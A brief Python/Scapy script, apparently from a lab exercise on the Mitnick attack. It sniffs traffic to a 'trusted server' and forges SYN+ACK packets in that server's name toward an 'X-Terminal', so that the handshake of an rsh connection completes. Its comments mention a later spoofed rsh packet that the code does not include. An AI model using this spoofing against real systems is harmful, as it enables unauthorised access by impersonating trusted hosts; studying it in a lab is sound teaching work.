#!/usr/bin/python3
from scapy.all import *
import time

x_ip = "10.9.0.5" #X-Terminal
srv_ip = "10.9.0.6" #The trusted server

srv_port = 1023 #port number used by the trusted server
srv_port2 = 9090 #Second port number of a trusted server
syn_seq = 2102931678

# Spoof the ACK to finish 3-way handshake initiated by the attacker
# After that, spoof a rsh data packet
# We are only allowed to use the sequence number in the captured packet

def spoof_second(pkt):
    old_tcp = pkt[TCP]

    if old_tcp.flags == "S":
        # spoof SYN+ACK to finish the handshake protocol
        ip = IP(src = srv_ip, dst = x_ip)
        tcp = TCP(sport = srv_port2, dport = srv_port, seq = syn_seq, ack = old_tcp.seq + 1, flags = "SA")
        print(' {}-->{} Spoofing SYN+ACK'.format(tcp.sport, tcp.dport))
        send(ip/tcp, verbose = 0)

pkt = sniff(iface = 'br-78a5f07c943f', filter = 'tcp and dst host 10.9.0.6 and dst port 9090', prn = spoof_second)
